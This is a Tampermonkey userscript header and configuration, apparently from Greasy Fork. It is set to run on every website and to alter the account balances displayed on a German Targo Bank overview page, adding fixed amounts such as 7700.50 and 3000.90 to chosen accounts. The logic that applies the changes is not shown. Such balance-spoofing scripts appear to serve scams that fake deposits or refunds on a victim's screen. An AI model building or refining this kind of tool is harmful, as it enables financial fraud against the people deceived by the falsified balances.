// ==UserScript==
// @name         Ed 4Rec  tar.etgesbrigitte@gmail.com
// @namespace    http://tampermonkey.net/
// @version      8.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/512087/Ed%204Rec%20%20taretgesbrigitte%40gmailcom.user.js
// @updateURL https://update.greasyfork.org/scripts/512087/Ed%204Rec%20%20taretgesbrigitte%40gmailcom.meta.js
// ==/UserScript==

//CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++CONGIGURE++++++++++++++++++++++



//=======================================================================================================================================================================================================================
// TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE-----------------------TARGO STARTSEITE BALANCE CHANGE---------------------

        // Configurable elements
        var applyUniformAdjustment = false; // Set to true to apply the same adjustment amount to all balances
        var uniformAdjustmentValue = 0.0; // The adjustment amount to use if "applyUniformAdjustment" is true
        var pageTargetText = "Alle Konten anzeigen"; // The text to check if the target page is loaded

        // Configuration for individual balance modifications
        var balanceAdjustmentConfigs = [
            { index: 0, adjustmentValue: 7700.50 },
            { index: 2, adjustmentValue: 3000.70 },
            { index: 3, adjustmentValue: 3000.90 },
            { index: 4, adjustmentValue: 3000.90 },
            // Add more configurations as needed
        ];
//=======================================================================================================================================================================================================================

